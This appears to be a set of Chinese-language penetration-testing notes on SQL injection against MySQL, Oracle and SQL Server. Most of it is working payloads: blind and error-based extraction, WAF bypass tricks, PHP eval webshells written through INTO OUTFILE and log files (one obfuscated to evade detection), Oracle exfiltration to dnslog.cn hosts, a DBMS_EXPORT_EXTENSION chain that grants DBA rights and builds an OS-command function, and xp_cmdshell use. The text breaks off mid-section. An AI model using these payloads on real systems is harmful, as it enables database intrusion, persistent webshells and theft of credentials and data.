select * from test where id=1/(1=1);
select * from test where id=1/('a'like'a%');
select * from test where id=1/(user()like'a%'); -- 拦user()
select * from test where id=1/(current_user like'a%'); -- 拦like

过滤
AND --> &&
OR --> 不用OR
substr --> substring
单引号转义 --> 宽字符
括号过滤 --> 注入 current_user

预编译
模糊查询对应 --> '%'.this.id.'%'
派生表排序注入 --> id desc esc

长度限制绕过
lx448@localhost
lx448@lx448
user()like'l%' --> 1 --> 第一位确定
user()like'lx%' --> 1 --> 第二位确定
user()like'lx4%' --> 长度被限制
user()like'%x4%' --> 1 --> 第三位确定

user()like'%44%' -- user()like'%48%' -- 都返回1

ord(user())=114 -- 只出第一位最短payload
id=ord(user())-112 -- 爆破数字
id=ord(user()) - x = 2 -- 构造方程

select * from test where id='1' and sleep(1) and '1'; -- 会延时吗
select * from test where id='1' or sleep(1) and '1'; -- 会延时吗
select * from test where id=('1' and sleep(1) and '1'); -- 注释的噩梦

or可以乱用吗
select * -- or -- delect *
select * from test where id='1' or sleep(1)or'' -- 有几个数据延时几秒

布尔构造
1/(current_user like 'r%')
1/(current_user regexp '^r.*') -- 拦like
1/(substr(current_user,2,1)='r') -- 第一个 2 遍历字符
1/(substring(current_user,2,1)='r') -- 绕 waf

id='1''
id='1'''
id='1'and'1'; -- 判断是否能用字母
id='1'/1/'1'
id='2'/bool/'1'
id='2'/(current_user like 'r%')/'1'

无回显的时候
update test set id='97' where id ='98';
update test set id='97' where id ='98' or '1';
update test set id='97' where id ='98' and '1';
update test set id='97' where id ='98' and 0;
update test set id='97' where id ='98' or sleep(1) or '1';
update test set id='97' where id ='98' and sleep(1) or '1';

and exp(710-(current_user like 'r%') -- 字符型

a'and exp(709)/exp(710-(current_user like 'r%')='1

'99'/exp(710-(current_user like 'r%')/'1'
and if(current_user like 'r%',sleep(1),1)

admin%27or+1/(case+when+substr(user(),1,1)=%27n%27+then+exp(710)+else+1+end)=%271
admin'or 1/(case when substr(user(),1,1)='n' then exp(710) else 1 end)='1
admin'or+1/(substr(user(),1,1)='n')='1

order by 的注入手段
SELECT * FROM test WHERE id='98' order by id,if(current_user like 'r%',(select sleep(1)),1) desc;
SELECT * FROM test WHERE id='98' order by id desc,if(current_user like 'r%',(select sleep(1)),1);
if(1=1,(select sleep(1)),1)

and if(1=1,sleep(5),1)
and if(mid(user(),1,1)='r',sleep(5),1)
and if(length(user())=4,sleep(5),1)

1 and if(ascii(mid((select group_concat(table_name) from information_schema.columns where table_schema=0x7316C7457343 and table_name=0x7316C7457343),1,1))=114,sleep(5),1)

1 and if(ascii(mid((select usename from admin where id=1),1,1))=114,sleep(5),1)
1'and (select 1 from (select if(current_user like 'r%',sleep(1),1))a) and '1

and (select 1 from (select count(*),(floor(rand(0)*2))x from information_schema.tables group by x)a)
and (select 1 from (select count(*),(concat(user(),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x)a)
and (select 1 from (select count(*),(concat(database(),0x7e,floor(rand(0)*2)))x from information_schema.tables group by x)a)

update 语句进行 bool 判断

CREATE TABLE test (
  id INT,
  a INT
);
INSERT INTO test (id, a) VALUES ('1', '98');
INSERT INTO test (id, a) VALUES ('2', '99');

update test set a='100'&&current_user like 'r%'&&'1' where id='2';
SELECT * FROM test WHERE id='2';

updatexml(1,concat(0x7e,(select database()),0x7e),1)
extractvalue(1,concat(0x7e,database(),0x7e))
```

## 字符绕过

### 过滤逗号

```plain
union select 1,2,3
union select * from ((select 1)a JOIN (select 2)b JOIN (select 3)c)%23

union select * from ((select 1)a JOIN (select 2)b JOIN (select CONCAT_WS(CHAR(32,58,32),user(),database(),version()))c)%23

substr((select database()) from 1 for 2) 
```

### 过滤“>”尖括号

```plain
在sqlmap中使用between and 代替其它字符加上 --tamper=between 即可

判断条件真假
2 > 1   #真
0 > 1   #假
#以下用between and 实现判断真假
2 between 1 and 3   #真
3 betwwen 1 and 2   #假
```

### 空格绕过

```plain
两个空格代替一个空格，用Tab代替空格，%a0=空格。
/**/代替空格
()代替空格
+
```

### 过滤or and

```plain
and = &&、or = ||、xor = |、not = !
```

  

### 过滤=号

```plain
like、regexp
select *from user where id like "test%" (%匹配任意，_匹配一个)
case when 1=user like 'a%' then 1 else 1 end
and user() like "a%" and 1=1
Between也可以
```

  

  

## 应用层逻辑层绕过waf

### 溢出

有的时候,由于数据太大,会导致waf无法将所有的数据都检测完成,这个时候会忽略掉我们带入的sql注入语句,从而绕过,使用post请求,对服务器请求很大资源逃逸sql注入语句

```plain
缓冲区溢出
select * from users where id=1  and (select 1)=(Select 0xA*1000) uNiOn SeLeCt 1,2,version();//自测成功,继续加油0xA*1000  指的是0XA后面的 "A" 重复1000次一般来说对应用软件构成缓冲区溢出都需要比较大的测试长度这里1000仅供参考,在一些情况下也可以更短
```

### 参数污染

有的waf仅对部分内容进行过滤如

```plain
index.php?id=1&id=2
```

这样的参数id=1,waf也许仅对前面的 id进行检测,而后面的参数并不做处理

```plain
HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。

原理：浏览器在跟服务器进行交互的过程中，浏览器往往会在GET/POST请求里面带上参数，这些参数会以 名称-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：http://www.baidu.com?name=aa&name=bb ，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是name=aa。有的服务器是取第二个参数，也就是name=bb。有的服务器两个参数都取，也就是name=aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。

HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同Web服务器对于出现多个参数时的选择：

通过HPP接管账户
当网站开发者不熟悉Web服务器对于多参数时如何选择，将给攻击者可乘之机。HPP能针对客户端和服务端进行攻击。

HPP参数污染还可以用于绕过某些防火墙对于 SQL注入的检测，例如当Web服务器对多参数都同时选择时，我们可以用以下这种方式绕过某些防火墙：
http://www.baidu.com/index.asp?page=select 1,2,3 from table where id=1
http://www.baidu.com/index.asp?page=select 1&page=2,3 from table where id=1
```

### 加入特殊字符

```plain
`updatexml`
(updatexml)
and!!!!1=1
/**/
/*!50000*/
/*!%26%26*/
`information_schema`.schemata
`information_schema`.`schemata`
information_schema.`schemata`
(information_schema.schemata)
information_schema/**/.schemata
```

### IP

云waf防护，一般我们会尝试通过查找站点的真实IP，从而绕过CDN防护

### 更改请求方式

```plain
当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输入,可尝试Bypass。

HTTP和HTTPS同时开放服务，没有做HTTP到HTTPS的强制跳转，导致HTTPS有WAF防护，HTTP没有防护，直接访问HTTP站点绕过防护。

文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过
```

### 更改请求体

![](H:\笔记\imgs\漏洞笔记img\image-20240612203212739.png)

### 截断

特殊符号%00，部分waf遇到%00截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致Bypass。比如：id=1 %00 and 1=2 union select 1,2,column\_name from information\_schema.columns

### 白名单

```plain
方式一：IP白名单
从网络层获取的ip，这种一般伪造不来，如果是获取客户端的IP，这样就可能存在伪造IP绕过的情况。
测试方法：修改http的header来bypasswaf
X-forwarded-for
X-remote-IP
X-originating-IP
x-remote-addr
X-Real-ip

方式二：静态资源
特定的静态资源后缀请求，常见的静态文件(.js.jpg.swf.css等等)，类似白名单机制，waf为了检测
效率，不去检测这样一些静态文件名后缀的请求。
http://10.9.9.201/sql.php?id=1
http://10.9.9.201/sql.php/1.js?id=1
备注：Aspx/php只识别到前面的.aspx/.php后面基本不识别

方式三：url白名单
为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势

涉及资源：
https://www.cnblogs.com/backlion/p/9721687.html
https://blog.csdn.net/nzjdsds/article/details/93740686
```

  

# 各种数据库

## MySQL数据库

### 基础

MySQL默认的数据库有：sys、mysql、performance\_schema、information\_schema；  
information\_schema存放着所有的数据库信息(5.0版本以上才有这个库)  
这个库有三个表：

-   SCHEMATA该表存放用户创建的所有数据库库名

-   **SCHEMA\_NAME 字段**记录数据库库名

-   TABLES该表存放用户创建的所有数据库库名和表名

-   **TABLE\_SCHEMA 字段**记录数据库名

-   **TABLE\_NAME 字段**记录表名

-   COLUMNS该表存放用户创建的所有数据库库名、表名和字段名

-   **TABLE\_SCHEMA 字段**记录数据库名

-   **TABLE\_NAME 字段**记录表名

-   **COLUMN\_NAME 字段**记录字段名

  

### 语句

```plain
注数据库名
select database()

注表名
select table_name from information_schema.tables where table_schema='数据库名' limit 0,1

注字段名
select column_name from information_schema.columns where table_schema='数据库名' and table_name='表名' limit 0,1

取数据
select concat(username,0x3a,password) from users limit 0,1
```

  

### 技巧

```plain
user()函数被过滤可以使用全局变量current_user

mysql注释符有三种：#、/*…*/、–…(注意–后面有一个空格，或者为–+)

空格符:[0x09,0x0a-0x0d,0x20,0xa0]

%00,%0A,?,/0,........,%80-%99

特殊符号：%a、%0a换行符

-连接符
SELECT * from users WHERE username=admin' and 1=1#'
SELECT * from users WHERE username=admin' -sleep(5)

可结合注释符使用%23%0a，%2d%2d%0a。

'and+(SELECT+1+UNION+SELECT+2) 报错

and 0 和or 1 的短路特性
select * from users where id=1 and 1 and sleep(1);    执行sleep(1)延时1s 但查不到数据
select * from users where id=1 and 0 and sleep(1);    不会执行sleep(1)
select * from users where id=1 or 1 and sleep(1);     执行sleep(1)，根据表中条数来延时
select * from users where id=1 or 0 and sleep(1);     不会执行sleep(1),返回id=1的值

扩展(利用逻辑运算符的特性)
select * from users where id=1 xor 1 and '';           查询表除id=1外所有的数据
select * from users where id=1 xor 0 and '';           查询id=1的数据
select * from users where id=1 ^ 1 ^ '';               查询结果为空
select * from users where id=1 ^ 0 ^ '';               查询1d=1的数据

在通过改变结果为1和0的语句进行判断
例如：select * from users where id=1 xor substr(user(),1,1)='r' xor '';等等...
```
```plain

select ~0=1	错误
select ~1=1	正常

```

内联注释

```plain
例如MySQL服务器可以在以下语句中识别STRAIGHT_JOIN关键字,而其他服务器则不能：
SELECT /*! STRAIGHT_JOIN*/ col1 FROM table1,table2 WHERE ...
如果在!后面添加版本号,则仅当MySQL版本大于或者等于指定的版本号时,才会执行注释中的语法。例如,以下注释中的关键字KEY_BLOCK_SIZE仅由MySQL 5.1.10或者更高版本的服务器执行：
CREATE TABLE t1(a INT, KEY (a)) /*!50110 KEY_BLOCK_SIZE=1024*/
/*! */类型的注释,内部语句会被执行
select bbb from table1 where aaa='' union /*! select database()*/;
可以用来绕过一些WAF,或者是绕过空格
但是,不能将关键词用注释分开,例如下面的语句是不可执行的（或者说只能在某些较老版本执行）
select bbb from table1 where balabala='' union se/*!lect database()*/;
```

1.  mysql黑魔法  
    select{xusername}from{x11test.admin};

2.  特性、

```plain
1.= 等于
：= 赋值
@ @+变量名可直接调用
select * from users where id=1 union select @test=user(),2,3;//1
select * from users where id=1 union select @test:=user(),2,3;//自测可用,继续加油,root
select * from users where id=1 union select @,2,3;//NULL
```

  

### mysql写shell

#### outfile和dumpfile写shell

##### 利用条件

过滤了单引号into outfile还能用吗？不能，GPC要off才行，可以测试Hex编码

```plain
数据库当前用户为root权限；
知道当前网站的绝对路径；
PHP的GPC为 off状态；(魔术引号，GET，POST，Cookie)
写入的那个路径存在写入权限。
```

##### 基于UNION联合查询

```plain
?id=1 UNION ALL SELECT 1,'<?php phpinfo();?>',3 into outfile 'C:\info.php'%23
?id=1 union select 1,"<?php @eval($_POST['g']);?>",3 into outfile 'E:/study/WWW/evil.php'
?id=1 union select 1,0x223c3f70687020406576616c28245f504f53545b2767275d293b3f3e22,3 into outfile "E:/study/WWW/evil.php"
?id=1 UNION ALL SELECT 1,'<?php phpinfo();?>',3 into dumpfile 'C:\info.php'%23
```

##### 非联合查询

当注入点为盲注或报错,无法使用联合查询时，我们可以使用fields terminated by与lines terminated by来写shell

```plain
?id=1 LIMIT 0,1 INTO OUTFILE 'E:/study/WWW/evil.php' lines terminated by 0x20273c3f70687020406576616c28245f504f53545b2767275d293b3f3e27 --
?id=1 into outfile 'C:\info.php' FIELDS TERMINATED BY '<?php phpinfo();?>'%23
?id=1 INTO OUTFILE '物理路径' lines terminated by  （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' fields terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' columns terminated by （一句话hex编码）#
?id=1 INTO OUTFILE '物理路径' lines starting by    （一句话hex编码）#
```

##### 代替空格的方法

+号，%0a、%0b、%a0 、 /\*\*/ 注释符等

##### outfile和dumpfile的区别

outfile

```plain
1、支持多行数据同时导出
2、使用union联合查询时，要保证两侧查询的列数相同
3、会在换行符制表符后面追加反斜杠
4、会在末尾追加换行

//outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径。这个问题在php注入中更加麻烦，因为会自动将单引号转义成’,那么基本就GG了，但是load_file，后面的路径可以是单引号、0x、char转换的字符，但是路径中的斜杠是/而不是\
```

dumpfile

```plain
1、每次只能导出一行数据
2、不会在换行符制表符后面追加反斜杠
3、不会在末尾追加换行
```

因此，我们可以使用into dumpfile这个函数来顺利写入二进制文件;  
当然into outfile函数也可以写入二进制文件，只是最终无法生效罢了（追加的反斜杠会使二进制文件无法生效）  
如果服务器端本身的查询语句，结果有多行，但是我们又想使用dump file，应该手动添加 limit 限制

#### 突破secure-file-priv写shell

MySQL的secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD\_FILE()传到哪个指定目录的。  
当secure\_file\_priv的值没有具体值时，表示不对MySQL的导入|导出做限制，如果是null，表示MySQL不允许导入导出。  
而且在mysql 5.6.34版本以后 secure\_file\_priv 的值默认为NULL。并且无法用SQL语句对其进行修改

#### 基于日志写shell

（ outfile被禁止，或者写入文件被拦截，没写权限 ，有root权限）

```plain
show variables like '%general%';	--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)
set global general_log = on;		--开启日志监测，默认关闭(如果一直开文件会很大的)
set global general_log_file = '/var/www/html/info.php';		--设置日志路径
select '<?php phpinfo();?>';		--执行查询，写入shell
set global general_log=off; --结束后，恢复日志路径，关闭日志监测

--SQL查询免杀shell
select "<?php $sl = create_function('', @$_REQUEST['klion']);$sl();?>";

SELECT "<?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?>";

---------------
--慢查询写shell
---------------
为什么要用慢查询写呢？上边说过开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错
show variables like '%slow_query_log%';		--查看慢查询信息
set global slow_query_log=1;				--启用慢查询日志(默认禁用)
set global slow_query_log_file='C:\\phpStudy\\WWW\\shell.php';	--修改日志文件路径
select '<?php @eval($_POST[abc]);?>' or sleep(11);				--写shell
```

慢查询补充

因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志。一般都是通过long\_query\_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。  
如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中

```plain
show global variables like '%long_query_time%'		--查看服务器默认时间值
```

通常情况下执行sql语句时的执行时间一般不会超过10s，所以说这个日志文件应该是比较小的，而且默认也是禁用状态，不会引起管理员的察觉  
拿到shell后上传一个新的shell，删掉原来shell，新shell做隐藏，这样shell可能还能活的时间长些  
像这种东西还是比较适合那些集成环境,比如,appserv,xampp...因为权限全部都映射到同一个系统用户上了,如果是win平台,权限通常都比较高

### 提权

#### MySQL\_UDF提取

```plain
1.目标系统是Windows(Win2000,XP,Win2003)；
2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数
3.有root账号密码 导出udf: MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数
 可以在mysql里输入select @@basedirshow variables like ‘%plugins%’ 寻找mysql安装路径 提权:
使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；
```

  

```plain
UDF (user defined function)，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充， 
其实就像使用本地MySQL函数如 user() 或 concat() 等

```

#### MOF提权

```plain
C:/Windows/system32/wbem/mof/目录下的mof文件每隔几秒就会被系统执行一次，因为这个 MOF 里面有一部分是 VBS脚本，所以可以利用这个VBS脚本 来调用CMD来执行系统命令
如果 MySQL有权限操作 mof 目录的话，就可以来执行任意命令了。
```

  

## Oracle

### 基础

#### 权限和用户

-   DBA: 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。

-   RESOURCE:拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。

-   CONNECT:拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构

#### 特殊表

##### dba\_tables :

系统里所有的表的信息，需要DBA权限才能查询

##### all\_tables

当前用户有权限的表的信息

##### dual表

是一个虚拟的表，用来构成select的语法规则，oracle保证dual里面永远只有一条记录。

##### user\_tables表

当前用户下的表的信息，该表的table\_name列存放着当前数据库的所有表

##### user\_tab\_columns表

该表的column\_name 存放着表的所有列

  

### 技巧

#### 字符

```plain
用不了1=1、1=2

运算：exp(291-1)、1/0

decode：decode(1,1,1,2) 1等于1返回1，否则返回2

1/decode(REGEXP_SUBSTR(user,'.',4,1),'s',1,0)

'||1/decode(lpad(user,2,1),'PH',1,0)||'

注释符：–、/**/

空白字符：[0x00,0x09，0x0a-0x0d,0x20]

连接符||

时间延迟：select 1 from dual where DBMS_PIPE.RECEIVE_MESSAGE('asd', REPLACE((SELECT substr(user, 1, 1) FROM dual), 'S', 10))=1;
DBMS_PIPE.RECEIVE_MESSAGE('a',4)='a' 延迟4秒

SELECT INSTR('haystack needle haystack', 'needle') FROM dual;  -- 返回 10
```

  

#### 特性

```plain
1.Oracle查询需要带上表名
如select * from xxx (有一个万能的表：dual表)。

2.单行子查询返回多行需使用 where rownum=1来规范
• rownum 是伪序列数，总是从1开始。
• oracle数据库从数据文件或缓冲区中读取数据的顺序。
• 它取得第一条记录则rownum值为1，第二条为2，依次类推。

3.在oracle之中，没有专门的内置时间函数，但是它有一个向远端服务器发送http请求的内置函数，UTL_HTTP,如果发送一个不存在的远端主机请 求，它就会尝试去连接，这样势必会造成一定程度的延迟
    
4.Oracle中没有空字符，''和’null’都是null，而MySQL中认为''仍然是一个字符串
```

  

  

### 报错注入

报错注入是一种通过函数报错前进行子查询获取数据，再通过错误页面回显的一种注入手法，下面介绍几种报错注入函数以及获取一些常见的获取数据，实际操作只需要将子查询内的查询语句进行替换即可。

```plain
ctxsys.drithsx.sn()
and 1=ctxsys.drithsx.sn(1,(select user from dual)) --
'||1/ctxsys.drithsx.sn('1,'||(select BUSINESS_TYPE_ATTR21 from T_CFG_BUS_TYPE where rownum=1))||'

XMLType()
and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --

dbms_xdb_version.checkin()
and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null --

bms_xdb_version.makeversioned()
and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --

dbms_xdb_version.uncheckout()
and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null --

dbms_utility.sqlid_to_sqlhash()
and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null --
```

  

### 外带数据

#### utl\_http.request

python起http服务，目标需出网权限

```plain
select utl_http.request('http://127.0.0.1/?result='||(select user from dual))from dual
```

#### utl\_inaddr.get\_host\_address

dns解析

```plain
select utl_inaddr.get_host_address((select user from dual)||'.cbb1ya.dnslog.cn') from dual
```

#### HTTPURITYPE

```plain
SELECT HTTPURITYPE((select user from dual)||'.24wypw.dnslog.cn').GETCLOB() FROM DUAL;
```

### 常用语句

```plain
注释符： -- +
```

  

```plain
当前用户：(select sys_context('userenv','current_user') from dual)
当前数据库：(select sys_context('userenv','db_name') from dual)
主机名：(select sys_context('userenv','host') from dual)
主机IP：(select sys_context('userenv','ip_address') from dual)
是否DBA：(select sys_context('userenv','isdba') from dual)
操作系统用户名：(select sys_context('userenv','os_user') from dual)
SYS用户Hash值：(select password from dba_users where username='SYS')
SYS用户Hash值：(select password from SYS.USER$ where name='SYS')
数据文件：(select name from v$datafile where rownum=1)
数据库版本：(select banner from v$version where rownum=1)
```

  

```plain
当前用户权限：select * from session_roles where rownum=1
判断当前权限是否为DBA：select t.DEFAULT_ROLE from user_role_privs t where t.granted_role='DBA';
当前数据库版本：select banner from sys.v_$version where rownum=1
服务器监听IP：select utl_inaddr.get_host_address from dual
服务器操作系统：select member from v$logfile where rownum=1

服务器sid：select instance_name fromv$instance
当前连接用户：select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual
SELECT USER FROM DUAL
查看用户的java权限（用户名必须大写）：
select * from user_java_policy where grantee_name='SDYSXY';

当前用户 select+user+from+dual+where+rownum=1
获取数据库名：select owner from all_tables where rownum=1
依次爆出所有数据库名，假设第一个库名为first_dbname哪个第二个库select owner from all_tables where rownum=1 and owner<>'first_dbname'依次类推
select+table_name+from+user_tables+where+rownum=1+and+table_name+not+in+'first_dbname'

获取表名：select table_name from user_tables where rownum=1，依次爆出所有表类似暴库。
select+table_name+from+user_tables+where+rownum=1+and+table_name+not+in+'PRODUCTS'

获取列名：select+column_name+from+user_tab_columns+where+table_name='first_dbname'+and+rownum=1
select+column_name+from+user_tab_columns+where+table_name='PRODUCTS'+and+rownum=1+and+column_name+not+in+'ID'

获取字段名：select column_name from user_tab_columns where table_name='tablename' and rownum=1，
获取数据库用户的密码：SELECT name, password, astatus FROM sys.user$;
```

  

### 提权

#### orcaleshell工具

查看数据库权限--is-dba

进入sqlmap的--sql-shell模式，用sql语句来查询

```plain
查询SID：select instance_name from v$instance
查询当前IP：select sys_context('userenv','ip_address') from dual
```

爆破所有数据库账号、密码

  

#### 手动提权

##### dbms\_export\_extension()

影响版本Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE

```plain
提到dba sys
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--','SYS',0,'1',0) from dual

# 创建java库
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args){try{BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"";myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"";myReader.close();return str;} catch (Exception e){return e.toString();}}}'''';END;'';END;--','SYS',0,'1',0) from dual

# 赋予Java权限
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''<>'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual
    

# 创建函数
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name''''''''LinxUtil.runCMD(java.lang.String) return String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual

# 赋予函数执行权限
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--','SYS',0,'1',0) from dual

# 执行系统命令
select sys.LinxRunCMD('/bin/bash -c /usr/bin/whoami') from dual

```

##### dbms\_xmlquery.newcontext()

-   必须在 DBMS\_PORT\_EXTENSION 存在漏洞情况下，否则赋予权限时无法成功

```plain
# 创建java库
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;

# 赋予当前用户Java权限
select user from dual
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''YY'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''<>'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual;

# 查看 all_objects 内部改变
select * from all_objects where object_name like '%LINX%' or object_name like '%Linx%'

# 创建函数
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;

# 判断是否创建成功
select OBJECT_ID from all_objects where object_name ='LINXRUNCMD'

# 执行命令
select LinxRunCMD('id') from dual

# 删除函数
drop function LinxRunCMD
```

  

#### xml反序列化绕过JVM执行命令 CVE-2018-3004

## SQLServer

### 基础

```plain
sysobjects：记录了数据库中所有表，常⽤字段为id、name和xtype。
syscolumns：记录了数据库中所有表的字段，常⽤字段为id、name和xtype。
id为标识，name为对应的表名和字段名，xtype为所对应的对象类型
top n #查询前n条记录;
limit 2,3 #查询第2条开始的3条数据;
查询dbo.sysobjects表中⽤户创建的表，获取其对应的id和name
dbo.sysobjects 系统⾃带库 xtype=‘U’ 是指⽤户创建的表
```

### 技巧

```plain
1. 用来注释掉注射后查询的其余部分：
   /*C语言风格注释
   SQL注释
   ;00％空字节
2. 空白符：[0x01-0x20]
3. 特殊符号：%3a冒号   id=1union:select1,2from:admin
4. 函数变形：如db_name 空白字符
5. union all select 1,2,null,4
```

  

### 语句

```plain
数据库版本：select @@VERSION
数据库名：select db_name()   union all select 1,db_name(),‘a’,4
select db_name(1);      #查询第一个数据库名
数据库ip地址：select local_net_address from sys.dm_exec_connextions where Session_id=@@spid
判断是否是SA权限
select is_srvrolemember('sysadmin')
查询表名
union all select 1,((select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='U')),'a',4
暴当前表中的列：
article.asp?id=6 group by admin.username having 1=1--
article.asp?id=6 group by admin.username,admin.password having 1=1--
暴任意表和列：
and (select top 1 name from (select top N id,name from sysobjects where xtype=char(85)) T order by id desc)>1
and (select top col_name(object_id('admin'),N) from sysobjects)>1
暴数据库数据：
and (select top 1 password from admin where id=N)>1
延时注入：'WAITFOR+DELAY+'0:0:5'--+
```

  

```plain
当前数据库：db_name()
主机名：host_name()
当前用户：system_user
当前用户密码Hash：(select sys.fn_varbintohexstr(password_hash) from sys.sql_logins where name=system_user)
数据库版本：substring(@@version,0,60)
主机IP：(select top 1 local_net_address from sys.dm_exec_connections where local_net_address is not null)
数据文件：(select top 1 filename from sysfiles)
public：cast(is_member(0x640062005F006F0077006E0065007200) as varchar)
db_owner：cast(is_member(0x7000750062006C0069006300) as varchar)

```

  

  

### 命令执行,提权

#### 扩展存储

```plain
扩展存储过程	说明
xp_cmdshell	直接执行系统命令
sp_OACreate()	直接执行系统命令
sp_OAMethod()	直接执行系统命令
xp_regread	进行注册表读取
xp_regwrite	写入到注册表
xp_dirtree	进行列目录操作
xp_ntsec_enumdomains	查看domain信息
xp_subdirs	通过xp_dirtree，xp_subdirs将在一个给定的文件夹中显示所有子文件夹
```

  

#### CLR

跟mysql的udf差不多，直接使用16进制代码来创建自定义函数

补充：trigger提权、沙盒提权、计划任务提权、sethc.exe 替换粘滞键提权

### getshell

#### xpcmdshell

xp\_cmdshell 是 Sql Server 中的一个组件，我们可以用它来执行系统命令。

-   拥有 DBA 权限, 在 2005 中 xp\_cmdshell 的权限是 system，2008 中是 network。

-   依赖 xplog70.dll

  

```plain
-- 判断当前是否为DBA权限，为1则可以提权
select is_srvrolemember('sysadmin');

-- 查看是否存在 xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 查看能否使用 xp_cmdshell，从MSSQL2005版本之后默认关闭
